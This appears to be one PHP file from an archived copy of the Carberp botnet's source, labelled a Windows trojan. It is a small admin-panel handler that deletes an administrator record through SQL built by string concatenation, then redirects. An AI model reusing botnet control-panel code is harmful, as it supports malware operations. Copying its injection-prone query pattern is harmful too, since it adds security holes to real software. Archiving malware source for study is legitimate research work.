/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
<?php

$mysqli->query('delete from bf_admins where (id=\''.$Cur['id'].'\')');

header('Location: /admins/index.html?ajax=1');
?>